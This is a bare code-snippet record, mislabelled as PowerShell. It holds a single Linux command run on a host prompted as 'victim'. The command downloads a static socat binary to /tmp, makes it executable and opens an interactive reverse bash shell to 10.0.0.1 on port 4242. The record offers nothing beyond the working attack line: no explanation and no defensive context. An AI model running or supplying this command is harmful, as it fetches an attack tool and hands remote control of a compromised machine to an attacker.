---
id: e054a01d-6bcf-45bd-9ca6-ca0f6b96d82e
type: code
language: Powershell
verified: false
created_at: '2023-04-06T03:56:24.199159+00:00'
updated_at: '2023-04-10T20:25:32.756749+00:00'
---

# Code Snippet e054a01d

**Language**: Powershell

```powershell
user@victim$ wget -q https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat -O /tmp/socat; chmod +x /tmp/socat; /tmp/socat exec:'bash -li',pty,stderr,setsid,sigint,sane tcp:10.0.0.1:4242
```


